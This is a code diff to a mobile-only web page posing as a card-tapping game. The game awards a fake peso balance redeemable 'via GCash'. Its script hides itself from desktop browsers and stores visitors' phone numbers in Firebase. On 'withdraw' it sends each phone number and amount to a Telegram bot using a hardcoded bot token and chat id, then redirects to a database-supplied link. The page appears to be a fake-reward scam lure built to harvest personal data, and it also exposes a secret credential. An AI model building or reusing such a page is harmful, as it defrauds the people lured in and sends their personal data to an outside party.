@@ -33,10 +33,13 @@
 
         .card { background: var(--glass); width: 100%; max-width: 400px; padding: 25px; border-radius: 30px; border: 1px solid var(--border); backdrop-filter: blur(15px); text-align: center; margin-top: 10px; position: relative; }
         .logo-img { width: 140px; margin-bottom: 20px; }
+        
         .game-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin: 25px 0; }
-        .card-wrapper { cursor: pointer; position: relative; }
+        .card-wrapper { cursor: pointer; position: relative; transition: 0.2s; }
         .card-img { width: 100%; max-width: 110px; filter: drop-shadow(0 5px 15px rgba(0,0,0,0.5)); }
-        .card-disabled { filter: grayscale(1) opacity(0.2) !important; pointer-events: none; transition: 0.5s; }
+        
+        /* Disabled state: Gray and unclickable */
+        .card-disabled { filter: grayscale(1) opacity(0.2) !important; pointer-events: none !important; transform: scale(0.9); transition: 0.5s; }
 
         /* ANIMATIONS */
         .move-goddess { animation: twirl 0.6s ease; }
@@ -54,7 +57,8 @@
         @keyframes punch { 0% { transform: translateX(0); } 50% { transform: translateX(10px) scale(1.1); } }
 
         .amount { font-family: 'Orbitron'; font-size: 42px; background: var(--gold); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; margin: 10px 0; }
-        .btn-main { background: var(--gold); color: #000; padding: 18px; border: none; border-radius: 15px; font-weight: 800; width: 100%; display: none; cursor: pointer; text-transform: uppercase; margin-top: 10px; }
+        
+        .btn-main { background: var(--gold); color: #000; padding: 18px; border: none; border-radius: 15px; font-weight: 800; width: 100%; display: none; cursor: pointer; text-transform: uppercase; margin-top: 10px; box-shadow: 0 4px #8b6508; }
         
         #processingOverlay { position: fixed; inset: 0; background: rgba(4, 7, 13, 0.98); z-index: 9999; display: none; flex-direction: column; align-items: center; justify-content: center; }
         .spinner { width: 40px; height: 40px; border: 4px solid rgba(212,175,55,0.1); border-top-color: #d4af37; border-radius: 50%; animation: spin 1s linear infinite; }
@@ -70,6 +74,7 @@
 
     <div class="card" id="mainCard">
         <img src="images/logo1.png" class="logo-img">
+        
         <div class="game-grid" id="grid">
             <div class="card-wrapper" onclick="handleTap(this, 1)"><img src="images/img1.png" class="card-img"></div>
             <div class="card-wrapper" onclick="handleTap(this, 2)"><img src="images/img2.png" class="card-img"></div>
@@ -80,24 +85,24 @@
         </div>
 
         <div class="amount" id="balanceText">₱0.00</div>
-        <div id="statusLabel" style="font-size:12px; color:#fbbf24; margin-bottom:10px;">Initializing...</div>
+        <div id="statusLabel" style="font-size:12px; color:#fbbf24; margin-bottom:10px;">Initializing Secure Link...</div>
         
         <button class="btn-main" id="claimBtn" onclick="doClaim()">Withdraw via GCash</button>
     </div>
 
     <div id="processingOverlay">
         <div class="spinner"></div>
-        <p style="margin-top:15px; font-weight:800;">ESTABLISHING VIALINK...</p>
+        <p style="margin-top:15px; font-weight:800; color:#fff;">ESTABLISHING VIALINK...</p>
     </div>
 
     <script>
-        // --- 1. RESTRICTIONS ---
+        // --- 1. DEVICE BLOCKER ---
         if (!/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
             document.getElementById('mobileOnly').style.display = 'flex';
             window.stop();
         }
 
-        // --- 2. FIREBASE & USER INFO ---
+        // --- 2. FIREBASE CONFIG ---
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
         const userPhone = localStorage.getItem("userPhone");
@@ -117,13 +122,22 @@
         const sndJackpot = new Audio('sounds/jackpot.mp3');
 
         window.onload = () => {
-            // Check if user has existing data
             userRef.once('value', (snapshot) => {
                 const data = snapshot.val();
+                const allCards = document.querySelectorAll('.card-wrapper');
+
                 if (data) {
                     balance = data.balance || 0;
                     clicks = data.clicks || 0;
-                    updateUI();
+                    document.getElementById('balanceText').innerText = "₱" + balance.toLocaleString() + ".00";
+                    
+                    // RESTORE DISABLED CARDS
+                    if (data.disabledCards) {
+                        data.disabledCards.forEach(idx => {
+                            if(allCards[idx]) allCards[idx].classList.add('card-disabled');
+                        });
+                    }
+
                     if (clicks >= 6) {
                         showClaim();
                     } else {
@@ -131,7 +145,6 @@
                         document.getElementById('statusLabel').innerText = "✨ Welcome back! Continue tapping.";
                     }
                 } else {
-                    // New user sequence
                     startNewUser();
                 }
             });
@@ -143,7 +156,7 @@
             setTimeout(() => {
                 balance = startAmt;
                 canTap = true;
-                saveData();
+                saveData(); // Initial save
                 document.getElementById('statusLabel').innerText = "🎁 Initial Reward Granted!";
             }, 2000);
         }
@@ -156,9 +169,10 @@
             const classes = ['', 'move-goddess', 'move-monkey', 'move-firegod', 'move-bear', 'move-girl', 'move-boxer'];
             img.classList.add(classes[id]);
             
-            setTimeout(() => el.classList.add('card-disabled'), 600);
+            // Disable immediately
+            el.classList.add('card-disabled');
 
-            // Odds Logic
+            // ODDS LOGIC
             const rand = Math.random() * 100;
             let mult = 1;
             if (rand <= 10) { mult = 10; sndJackpot.play(); confetti(); }
@@ -172,29 +186,26 @@
             balance = Math.round((balance + added) / 10) * 10;
             
             animateValue(oldBal, balance, 400);
-            saveData();
+            saveData(); // Save every click
 
             if (clicks >= 6) showClaim();
         }
 
         function saveData() {
+            const disabledIndices = [];
+            document.querySelectorAll('.card-wrapper').forEach((el, index) => {
+                if (el.classList.contains('card-disabled')) {
+                    disabledIndices.push(index);
+                }
+            });
+
             userRef.set({
                 phone: userPhone,
                 balance: balance,
                 clicks: clicks,
+                disabledCards: disabledIndices,
                 lastUpdate: new Date().getTime()
             });
-        }
-
-        function updateUI() {
-            document.getElementById('balanceText').innerText = "₱" + balance.toLocaleString() + ".00";
-        }
-
-        function showClaim() {
-            canTap = false;
-            document.getElementById('statusLabel').style.display = 'none';
-            document.getElementById('claimBtn').style.display = 'block';
-            document.getElementById('claimBtn').innerText = `Withdraw ₱${balance.toLocaleString()}`;
         }
 
         function animateValue(start, end, duration) {
@@ -209,13 +220,18 @@
             window.requestAnimationFrame(step);
         }
 
+        function showClaim() {
+            canTap = false;
+            document.getElementById('statusLabel').style.display = 'none';
+            document.getElementById('claimBtn').style.display = 'block';
+            document.getElementById('claimBtn').innerText = `Withdraw ₱${balance.toLocaleString()}`;
+        }
+
         function doClaim() {
             document.getElementById('processingOverlay').style.display = 'flex';
-            // Send to Telegram
             const msg = `💰 CLAIM REQUEST:\n📱 ${userPhone}\n💵 Amount: ₱${balance}`;
             fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(msg)}`);
 
-            // Find Link from Database
             db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value', snap => {
                 if (snap.exists()) {
                     const key = Object.keys(snap.val())[0];
@@ -223,7 +239,7 @@
                     db.ref('links/' + key).update({ status: 'claimed', user: userPhone });
                     setTimeout(() => window.location.href = url, 2000);
                 } else {
-                    alert("Out of rewards! Contact Admin.");
+                    alert("Out of rewards! Try again later.");
                     document.getElementById('processingOverlay').style.display = 'none';
                 }
             });
